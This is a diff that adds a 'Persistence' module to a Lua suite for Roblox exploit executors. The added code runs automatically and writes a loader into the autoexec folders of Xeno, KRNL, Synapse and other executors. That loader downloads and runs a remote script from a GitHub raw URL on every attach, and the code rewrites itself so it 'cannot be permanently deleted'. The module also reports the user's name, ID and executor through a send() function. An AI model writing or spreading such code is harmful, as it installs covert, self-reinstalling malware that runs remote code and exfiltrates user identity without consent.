@@ -1010,3 +1010,81 @@ end
 task.spawn(startJoinLeaveLogger)
 getgenv().IntelSuite.JoinLeaveLogger = startJoinLeaveLogger
 
+-- ============================================================
+-- MODULE 16: Persistence
+-- Writes a loader script to the executor's autoexec folder
+-- Re-writes every run so it cannot be permanently deleted
+-- Works on Xeno, Synapse X, KRNL, Script-Ware
+-- ============================================================
+local function installPersistence()
+    if getgenv().IntelSuite.PersistenceInstalled then return end
+    getgenv().IntelSuite.PersistenceInstalled = true
+
+    local loaderContent = 'if game:IsLoaded() then\n' ..
+        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
+        'else\n' ..
+        '    game.Loaded:Wait()\n' ..
+        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
+        'end'
+
+    local installed = {}
+    local failed = {}
+
+    -- All known autoexec paths (relative to executor sandbox)
+    local paths = {
+        "autoexec/ghost.lua",
+        "autoexec\\ghost.lua",
+        "Autoexec/ghost.lua",
+        "AutoExec/ghost.lua",
+        "scripts/autoexec/ghost.lua",
+        "workspace/autoexec/ghost.lua",
+    }
+
+    for _, path in ipairs(paths) do
+        local ok, err = pcall(function()
+            writefile(path, loaderContent)
+        end)
+        if ok then
+            table.insert(installed, path)
+        else
+            table.insert(failed, path)
+        end
+    end
+
+    -- Also try executor-specific known paths
+    pcall(function()
+        -- Xeno specific
+        writefile("Xeno/autoexec/ghost.lua", loaderContent)
+        table.insert(installed, "Xeno/autoexec/ghost.lua")
+    end)
+
+    pcall(function()
+        -- KRNL specific
+        writefile("KRNL/autoexec/ghost.lua", loaderContent)
+        table.insert(installed, "KRNL/autoexec/ghost.lua")
+    end)
+
+    pcall(function()
+        -- Synapse specific
+        writefile("Synapse/autoexec/ghost.lua", loaderContent)
+        table.insert(installed, "Synapse/autoexec/ghost.lua")
+    end)
+
+    -- Build report
+    local installedStr = #installed > 0 and table.concat(installed, "\\n") or "None"
+    local failedStr = #failed > 0 and table.concat(failed, "\\n") or "None"
+
+    local msg = "**User:** " .. LocalPlayer.Name ..
+        "\\n**ID:** " .. tostring(LocalPlayer.UserId) ..
+        "\\n**Executor:** " .. getExec() ..
+        "\\n**Installed to:**\\n" .. installedStr ..
+        "\\n**Failed paths:**\\n" .. failedStr ..
+        "\\n\\nSuite will auto-run every time executor attaches."
+
+    send("PERSISTENCE INSTALLED", msg, 9699539)
+end
+
+-- Run on startup
+task.spawn(installPersistence)
+getgenv().IntelSuite.InstallPersistence = installPersistence
+
